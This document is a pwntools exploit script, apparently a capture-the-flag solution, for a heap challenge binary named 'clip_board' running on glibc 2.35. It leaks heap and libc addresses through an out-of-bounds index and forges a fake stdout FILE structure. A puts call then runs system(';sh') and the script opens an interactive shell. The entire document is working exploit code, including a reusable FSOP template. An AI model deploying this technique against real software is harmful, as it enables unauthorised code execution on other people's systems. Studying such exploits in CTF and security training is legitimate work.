#!/usr/bin/env python2
from pwn import *
libc = ELF("./libc.so.6")
context.arch = "amd64"
context.terminal = "tmux split -h".split()
p = process("./clip_board", env={"LD_PRELOAD":"./libc.so.6"})
context.terminal = "tmux split -h".split(" ")

def add(idx, size, contents):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))
    p.sendlineafter("> ", contents)
    
def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(idx))
    
def view(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("> ", str(idx))

heap = int(p.recvline().strip().split(b": ")[1], 16) - 0x2a0
print ("heap", hex(heap))

add(1, 255, "AAAA")
add(9, 255, "CCCCCCCCCCC")
view(-4)

data = p.recvline()
libc_base = u64(data[8:16]) - 0x21a803
print ("libc", hex(libc_base))

delete(9)
# gdb.attach(p, """
# b*0x00007FFFF7E16BF4
# """)

# fsop template for glibc 2.35 (nice reference from 'qwerty', https://qwerty-po.github.io/)
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
_IO_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']
print "jumps", hex(_IO_file_jumps)
print "wjumps", hex(_IO_wfile_jumps)
fsop_addr = heap + 0x4f0
print "fsop ", hex(fsop_addr)

# trigger system(flags) at _IO_wdoallocbuf+0x2B
FSOP = FSOP_struct(
    # flags & 2 == 0
    # flags & 8 == 0
    # flags & 0x8000 == 0
    flags = u64("\x01\x01;sh\x00\x00\x00"),

    # here, lock-related operations will overwrite _IO_read_end
    # _IO_read_ptr should be 0
    lock            = fsop_addr + 0x10,
    
    # wide_data[3] == 0 (chunk's prev_size)
    # wide_data[6] == 0 (_IO_read_ptr)
    # wide_data[28] (= 0xb8 = __pad5)
    _wide_data      = fsop_addr - 0x28,

    _markers        = libc_base + libc.symbols['system'],
    vtable          = _IO_wfile_jumps - 0x20, # __xsputn -> _IO_wfile_overflow (@ puts+0xC8)

    # call __pad5 + 0x68 -> call _markers
    __pad5          = fsop_addr - 0x8
)
           
# Now, puts gonna trigger system("\x01\x01;sh\x00\x00\x00") thanks to our fake stdout
add(-4, len(FSOP), FSOP)

p.interactive()
